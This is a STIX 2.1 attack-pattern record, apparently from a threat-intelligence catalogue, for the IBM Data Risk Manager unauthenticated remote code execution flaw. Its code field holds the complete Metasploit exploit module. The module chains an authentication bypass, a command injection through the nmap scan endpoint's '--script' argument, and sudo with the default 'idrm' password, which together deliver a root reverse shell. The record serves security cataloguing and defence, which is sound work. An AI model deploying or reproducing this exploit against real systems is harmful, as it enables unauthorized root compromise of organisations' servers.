{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c11ffb09-6cca-4759-9202-a35886156292",
    "created": "2024-08-14T17:02:25.626911Z",
    "modified": "2024-08-14T17:02:25.626916Z",
    "name": "IBM Data Risk Manager Unauthenticated Remote Code Execution",
    "description": " IBM Data Risk Manager (IDRM) contains three vulnerabilities that can be chained by an unauthenticated attacker to achieve remote code execution as root. The first is an unauthenticated bypass, followed by a command injection as the server user and finally abuse of an insecure default password. This module exploits all three vulnerabilities, giving the attacker a root shell. At the time of disclosure this was an 0day, but it was later confirmed and patched by IBM. The authentication bypass works on versions <= 2.0.6.1, but the command injection should only work on versions <= 2.0.4 according to IBM. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/ibm_drm_rce.rb",
            "external_id": "ibm_drm_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2020/Apr/33"
        },
        {
            "source_name": "reference",
            "url": "https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'IBM Data Risk Manager Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          IBM Data Risk Manager (IDRM) contains three vulnerabilities that can be chained by\n          an unauthenticated attacker to achieve remote code execution as root.\n          The first is an unauthenticated bypass, followed by a command injection as the server user,\n          and finally abuse of an insecure default password.\n          This module exploits all three vulnerabilities, giving the attacker a root shell.\n          At the time of disclosure this was an 0day, but it was later confirmed and patched by IBM.\n          The authentication bypass works on versions <= 2.0.6.1, but the command injection should only work on\n          versions <= 2.0.4 according to IBM.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2020-4427' ], # auth bypass\n          [ 'CVE', '2020-4428' ], # command injection\n          [ 'CVE', '2020-4429' ], # insecure default password\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ],\n          [ 'URL', 'https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/' ]\n        ],\n        'Platform' => 'linux',\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Targets' => [\n          [ 'IBM Data Risk Manager <= 2.0.4', {} ]\n        ],\n        'Privileged' => true,\n        'DefaultOptions' => {\n          'WfsDelay' => 15,\n          'PAYLOAD' => 'linux/x64/shell_reverse_tcp',\n          'SSL' => true\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-04-21',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8443),\n        OptString.new('TARGETURI', [ true, 'Default server path', '/'])\n      ]\n    )\n  end\n\n  def check\n    # at the moment there is no better way to detect AND be stealthy about it\n    session_id = rand_text_alpha(5..12)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'saml', 'idpSelection'),\n      'method' => 'GET',\n      'vars_get' => {\n        'id' => session_id,\n        'userName' => 'admin'\n      }\n    })\n    if res && (res.code == 302) &&\n       res.headers['Location'].include?('localhost:8765') &&\n       res.headers['Location'].include?('saml/idpSelection')\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  # post-exploitation:\n  # - delete the .enc files that were uploaded (register_file_for_cleanup seems to crap out)\n  def on_new_session(client)\n    if client.type == 'meterpreter'\n      # stdapi must be loaded before we can use fs.file\n      client.core.use('stdapi') if !client.ext.aliases.include?('stdapi')\n      client.fs.file.rm(@script_filepath)\n      client.fs.file.rm(@payload_filepath)\n    else\n      client.shell_command_token(\"rm #{@script_filepath}\")\n      client.shell_command_token(\"rm #{@payload_filepath}\")\n    end\n  end\n\n  # version 2.0.1 runs as root, so we need to change the path to where we deploy the patches\n  def get_patches_path(cookie, csrf)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'getAppInfo'),\n      'method' => 'GET',\n      'cookie' => cookie,\n      'headers' => { 'CSRF-TOKEN' => csrf }\n    })\n\n    if res && (res.code == 200) && res.body =~ /appVersion\":\"2\\.0\\.1\"/\n      print_status(\"#{peer} - Detected IBM Data Risk Manager version 2.0.1\")\n      return '/root/agile3/patches/'\n    end\n    print_status(\"#{peer} - Detected IBM Data Risk Manager version 2.0.2 or above\")\n    '/home/a3user/agile3/patches/'\n  end\n\n  def create_session_id\n    # step 1: create a session ID and try to make it stick\n    session_id = rand_text_alpha(5..12)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'saml', 'idpSelection'),\n      'method' => 'GET',\n      'vars_get' => {\n        'id' => session_id,\n        'userName' => 'admin'\n      }\n    })\n    if res && (res.code != 302)\n      fail_with(Failure::Unknown, \"#{peer} - Failed to \\\"stick\\\" session ID\")\n    end\n\n    print_good(\"#{peer} - Successfully \\\"stickied\\\" our session ID #{session_id}\")\n\n    session_id\n  end\n\n  def free_the_admin(session_id)\n    # step 2: give the session ID to the server and have it grant us a free admin password\n    post_data = Rex::MIME::Message.new\n    post_data.add_part('', nil, nil, 'form-data; name=\"deviceid\"')\n    post_data.add_part(rand_text_alpha(8..15), nil, nil, 'form-data; name=\"password\"')\n    post_data.add_part('admin', nil, nil, 'form-data; name=\"username\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"clientDetails\"')\n    post_data.add_part(session_id, nil, nil, 'form-data; name=\"sessionId\"')\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'user', 'login'),\n      'method' => 'POST',\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    unless res && (res.code == 200) && res.body[/\"data\":\"([0-9a-f-]{36})/]\n      fail_with(Failure::Unknown, \"#{peer} - Failed to obtain the admin password.\")\n    end\n\n    password = Regexp.last_match(1)\n    print_good(\"#{peer} - We have obtained a new admin password #{password}\")\n\n    password\n  end\n\n  def login_and_csrf(password)\n    # step 3: login and get an authenticated cookie\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'login'),\n      'method' => 'POST',\n      'vars_post' => {\n        'userName' => 'admin',\n        'password' => password\n      }\n    })\n    unless res && (res.code == 302) && res.get_cookies\n      fail_with(Failure::Unknown, \"#{peer} - Failed to authenticate as an admin.\")\n    end\n\n    print_good(\"#{peer} - ... and are authenticated as an admin!\")\n    cookie = res.get_cookies\n    url = res.redirection.to_s\n\n    # step 4: obtain CSRF header in order to be able to make valid requests\n    res = send_request_cgi({\n      'uri' => url,\n      'method' => 'GET',\n      'cookie' => cookie\n    })\n\n    unless res && (res.code == 200) && res.body =~ /var csrfToken = \"([0-9a-f-]{36})\";/\n      fail_with(Failure::Unknown, \"#{peer} - Failed to authenticate obtain CSRF cookie.\")\n    end\n    csrf = Regexp.last_match(1)\n\n    return cookie, csrf\n  end\n\n  def upload_payload_and_script(cookie, csrf, patches_path)\n    # step 5: upload our payload\n    payload_file = \"#{rand_text_alpha(5..12)}.enc\"\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(generate_payload_exe, 'application/octet-stream', 'binary', \"form-data; name=\\\"patchFiles\\\"; filename=\\\"#{payload_file}\\\"\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'upload', 'patch'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'headers' => { 'CSRF-TOKEN' => csrf },\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    unless res && (res.code == 200)\n      fail_with(Failure::Unknown, \"#{peer} - Failed to upload payload.\")\n    end\n\n    print_good(\"#{peer} - We have uploaded our payload... \")\n\n    # step 6: upload our script file\n    # nmap will run as a3user (the server user), which has a default password of \"idrm\".\n    # a3user has sudo access, so that means we run as root!\n    # However let's do some basic error checking: if somehow the a3user password was changed and we cannot sudo\n    # to execute as root, we ensure our payload still executes as a3user.\n    #\n    # Note: for version 2.0.1, the above is not necessary as nmap runs as root. However, leave it anyway for simplicity.\n    script_file = \"#{rand_text_alpha(5..12)}.enc\"\n    @script_filepath = patches_path + script_file\n    @payload_filepath = patches_path + payload_file\n    rand_file = rand_text_alpha(5..12)\n    cmd = \"chmod +x #{@payload_filepath}; echo idrm | sudo -S whoami > /tmp/#{rand_file};\"\n    cmd << \" root=`cat /tmp/#{rand_file}`;\"\n    cmd << \" if [ $root == 'root' ]; then sudo #{@payload_filepath};\"\n    cmd << \" else #{@payload_filepath}; fi; rm /tmp/#{rand_file}\"\n    script_file_contents = \"os.execute(\\\"#{cmd}\\\")\"\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(script_file_contents, 'application/octet-stream', 'binary', \"form-data; name=\\\"patchFiles\\\"; filename=\\\"#{script_file}\\\"\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'upload', 'patch'),\n      'method' => 'POST',\n      'cookie' => cookie,\n      'headers' => { 'CSRF-TOKEN' => csrf },\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    unless res && (res.code == 200)\n      fail_with(Failure::Unknown, \"#{peer} - Failed to upload nmap script file.\")\n    end\n\n    print_good(\"#{peer} - and our nmap script file!\")\n  end\n\n  def obtain_bearer_token(password)\n    # step 7: we need to authenticate again to get a Bearer token (instead of the cookie we already have)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part('', nil, nil, 'form-data; name=\"deviceid\"')\n    post_data.add_part(password, nil, nil, 'form-data; name=\"password\"')\n    post_data.add_part('admin', nil, nil, 'form-data; name=\"username\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"clientDetails\"')\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'user', 'login'),\n      'method' => 'POST',\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    unless res && (res.code == 200) && res.body =~ /\"data\":\\{\"access_token\":\"([0-9a-f-]{36})\",\"token_type\":\"bearer\"/\n      fail_with(Failure::Unknown, \"#{peer} - Failed to obtain Bearer token.\")\n    end\n\n    bearer = Regexp.last_match(1)\n    print_good(\"#{peer} - Bearer token #{bearer} obtained, wait for the final step where we invoke nmap...\")\n\n    bearer\n  end\n\n  def exploit\n    # step 1: create a session ID and try to make it stick\n    session_id = create_session_id\n\n    # step 2: give the session ID to the server and have it grant us a free admin password\n    password = free_the_admin(session_id)\n\n    # step 3: login and get an authenticated cookie\n    # step 4: obtain CSRF header in order to be able to make valid requests\n    cookie, csrf = login_and_csrf(password)\n\n    patches_path = get_patches_path(cookie, csrf)\n\n    # step 5: upload our payload\n    # step 6: upload our script file\n    upload_payload_and_script(cookie, csrf, patches_path)\n\n    # step 7: we need to authenticate again to get a Bearer token (instead of the cookie we already have)\n    bearer = obtain_bearer_token(password)\n\n    # step 8 and final: invoke the nmap scan with our script file\n    script = \"--script=#{@script_filepath}\"\n    post_data = Rex::MIME::Message.new\n    post_data.add_part('', nil, nil, 'form-data; name=\"clientDetails\"')\n    post_data.add_part('1', nil, nil, 'form-data; name=\"type\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"portRange\"')\n    post_data.add_part(script, nil, nil, 'form-data; name=\"ipAddress\"')\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'albatross', 'restAPI', 'v2', 'nmap', 'run', 'scan', rand(99 + 1).to_s),\n      'method' => 'POST',\n      'headers' => { 'Authorization' => \"Bearer #{bearer}\" },\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n    unless res && (res.code == 200)\n      fail_with(Failure::Unknown, \"#{peer} - Failed to run nmap scan.\")\n    end\n\n    print_good(\"#{peer} - Shell incoming!\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-04-21",
    "x_mitre_platforms": [
        "linux'"
    ]
}